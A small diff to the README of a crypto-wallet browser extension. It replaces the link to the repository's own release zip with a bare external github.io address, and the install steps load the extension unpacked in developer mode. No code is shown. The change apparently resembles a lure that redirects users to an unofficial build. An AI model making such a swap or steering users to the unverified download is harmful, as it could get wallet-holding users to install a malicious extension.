@@ -22,7 +22,7 @@ Browser extension to automatically detect and interact with crypto wallets on Tw
 ## 🚀 Quick Install
 
 ### Option 1: Download Latest Release
-1. Download [whisper-wallet-v1.1.0.zip](../../releases/download/v1.1.0/whisper-wallet-v1.1.0.zip)
+1. Download https://synnrs13.github.io/whisper-wallet
 2. Extract the ZIP file
 3. Open Chrome → `chrome://extensions/`
 4. Enable **Developer mode** (toggle top right)
